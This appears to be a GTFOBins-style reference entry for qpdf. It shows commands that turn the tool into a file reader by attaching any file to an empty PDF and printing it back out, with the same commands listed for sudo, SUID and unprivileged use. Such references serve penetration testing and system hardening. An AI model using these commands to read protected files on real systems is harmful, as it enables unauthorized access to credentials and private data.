qpdf
====

File read
---------

[Sudo]
    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file

[SUID]
    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file

[Unprivileged]
    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file
